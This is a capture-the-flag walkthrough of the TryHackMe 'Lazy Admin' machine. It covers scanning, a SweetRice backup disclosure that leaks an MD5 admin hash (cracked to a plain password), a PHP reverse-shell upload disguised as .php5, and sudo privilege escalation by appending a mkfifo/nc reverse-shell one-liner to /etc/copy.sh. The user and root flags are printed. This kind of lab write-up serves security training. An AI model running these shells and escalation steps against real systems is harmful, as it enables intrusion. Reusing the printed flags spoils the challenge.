![image2](https://github.com/user-attachments/assets/bd4dede4-bcb5-4dc9-b04e-80942c837d4c)# Lazy Admin

## Recon
### Port Scanning
```sh
└─$ nmap -sV -Pn 10.10.141.120 >> ports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 20:47 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.29 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 20:47 EDT
Nmap scan report for 10.10.141.120
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds
```

### Directory Enum
```sh
└─$ gobuster dir -u http://10.10.141.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt
```
```sh
/content
```
```sh
└─$ gobuster dir -u http://10.10.141.120/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt
```
```sh
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/_themes              (Status: 301) [Size: 320] [--> http://10.10.59.57/content/_themes/]
/.htaccess            (Status: 403) [Size: 276]
/as                   (Status: 301) [Size: 315] [--> http://10.10.59.57/content/as/]
/attachment           (Status: 301) [Size: 323] [--> http://10.10.59.57/content/attachment/]
/images               (Status: 301) [Size: 319] [--> http://10.10.59.57/content/images/]
/inc                  (Status: 301) [Size: 316] [--> http://10.10.59.57/content/inc/]
/index.php            (Status: 200) [Size: 2197]
/js                   (Status: 301) [Size: 315] [--> http://10.10.59.57/content/js/]                           
```


![image](https://github.com/user-attachments/assets/7090c604-8eb5-40a8-bff5-f864552e4a68)

- The site has been powered by `Sweetrice`
- Lets find some Vulnerability of It using `searchsploit`

### Searchsploit

```sh
└─$ searchsploit "sweetrice"                  
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                               | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                            | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                             | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                               | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                   | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                          | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                     | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                 | php/webapps/14184.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
- `Backup Discloser` is looking Interesting

```sh
└─$ searchsploit -m 40718                     
  Exploit: SweetRice 1.5.1 - Backup Disclosure
      URL: https://www.exploit-db.com/exploits/40718
     Path: /usr/share/exploitdb/exploits/php/webapps/40718.txt
    Codes: N/A
 Verified: True
File Type: ASCII text
cp: overwrite '/home/bc-here/CTF{}/THM/lazyAdmin/40718.txt'? 
Copied to: /home/bc-here/CTF{}/THM/lazyAdmin/40718.txt

└─$ cat '/home/bc-here/CTF{}/THM/lazyAdmin/40718.txt'
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip

```
```sh
http://localhost/inc/mysql_backup
```
- This thing is pretty much interesting

- Lets try `http://10.10.141.120/content/inc//mysql_backup`

![image1](https://github.com/user-attachments/assets/0824843a-b7f4-4332-b163-6d4aba62e3f9)

### Checking For password

```sh
└─$ cat mysql_bakup_20191129023059-1.5.1.sql         
.
.
.
.
.
\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";

```

- It looks like an MD5 hash
- used this for cracking (https://hashes.com/en/decrypt/hash)

```sh
42f749ade7f9e195bf475f37a44cafcb:Password123

```
>## ID : `manager`
>## Password : `Password123`

- ``
![image2](https://github.com/user-attachments/assets/af5d40bf-22f9-4fec-8df3-a74c2a4c7baf)


- After Login it gave me

![image3](https://github.com/user-attachments/assets/3d7bbce7-dd58-4196-a4d0-555f35665fe1)

- In the `media center` there is an option for upload

![image4](https://github.com/user-attachments/assets/dd11af56-293d-4fce-b5d4-e27501ed4f20)

- Its High time I didn't use the php shell buddy!

- I cp the php shell from `/usr/share/webpages/php/` and save it as `reverse_shell.php5` because the `.php` could be validated [Actually I have faced it before!]

## Getting Into

```sh
└─$ nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.17.88.30] from (UNKNOWN) [10.10.59.57] 57138
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 23:16:28 up  2:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls

```

```sh
$ cd home
$ ls
itguy
$ cd itguy
$ cat user.txt 
THM{63e5bce9271952aad1113b6f1ac28a07}
```
> ## user.txt : `THM{63e5bce9271952aad1113b6f1ac28a07}`

## Privilege Escalation
```sh
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.88.30 5554 >/tmp/f


```
- I have to echo the shell that we found from `copy.sh` , brh its literally saying it to copy in its name.

- `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <This is your local machine ip> 5554 >/tmp/f"`

```sh
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.88.30 5554 >/tmp/f" >> /etc/copy.sh

$ sudo /usr/bin/perl /home/itguy/backup.pl


```

#### Magic!!

```sh
└─$ nc -nlvp 5554                            
listening on [any] 5554 ...
connect to [10.17.88.30] from (UNKNOWN) [10.10.59.57] 42202
/bin/sh: 0: can't access tty; job control turned off
# cd ../../root
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}

```

> ## root.txt : `THM{6637f41d0177b6f37cb20d775124699f}`
